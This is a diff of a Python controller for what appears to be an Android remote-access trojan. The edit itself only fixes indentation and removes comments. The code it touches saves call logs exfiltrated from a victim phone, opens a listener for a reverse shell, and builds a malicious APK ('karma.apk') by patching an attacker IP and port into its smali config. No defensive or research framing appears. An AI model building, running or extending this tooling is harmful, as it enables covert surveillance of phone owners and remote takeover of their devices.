@@ -269,22 +269,21 @@ def callLogs(client):
     msg = recvall(client)
     filename = "DATA"+direc+"Call_Logs_"+timestr+'.txt'
     if "No call logs" in msg:
-    	msg.split("\n")
-    	print(msg.replace("END123","").strip())
-    	print(" ")
+        msg.split("\n")
+        print(msg.replace("END123","").strip())
+        print(" ")
     else:
     	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
-    		txt.write(msg)
-    		txt.close()
-    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
-    		if not os.path.getsize(filename):
-    			os.remove(filename)
+            txt.write(msg)
+            txt.close()
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
+            if not os.path.getsize(filename):
+                os.remove(filename)
 
 def get_shell(ip,port):
     soc = socket.socket() 
     soc = socket.socket(type=socket.SOCK_STREAM)
     try:
-        # Restart the TCP server on exit
         soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         soc.bind((ip, int(port)))
     except Exception as e:
@@ -343,7 +342,6 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
     try:
         file = open(editor,"r").readlines()
-        #Very much uncertaninity but cant think any other way to do it xD
         file[18]=file[18][:21]+"\""+ip+"\""+"\n"
         file[23]=file[23][:21]+"\""+port+"\""+"\n"
         file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
@@ -354,8 +352,6 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
         sys.exit()
     java_version = execute("java -version")
     if java_version.returncode: print(stdOutput("error")+"Java not installed or found");exit()
-    #version_no = re.search(pattern, java_version.stderr).groups()[0]
-    # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
